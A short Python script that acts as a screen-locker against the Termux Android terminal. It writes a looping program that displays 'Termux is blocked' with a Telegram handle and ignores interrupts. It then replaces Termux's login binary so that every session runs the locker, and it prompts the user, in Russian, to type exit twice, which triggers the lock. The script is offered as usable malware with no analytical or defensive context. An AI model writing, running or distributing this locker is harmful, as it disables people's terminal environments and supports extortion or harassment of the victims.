import os

file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
file.write("""print('''  _____                                     
 |_   _|                                    
   | |    ___  _ __  _ __ ___   _   _ __  __
   | |   / _ \\| '__|| '_ ` _ \\ | | | |\\ \\/ /
   | |  |  __/| |   | | | | | || |_| | >  < 
   \\_/   \___||_|   |_| |_| |_| \__,_|/_/\_\


''')
while True:
	try:
		input(' Termux заблокирован. @TermuxGulde (Telegram)')
	except:
		pass
""")
file.close()
os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')

file = open('/data/data/com.termux/files/usr/bin/login', 'w')
file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
file.close()
print(' Напиши exit (дважды) для перезагрузки')
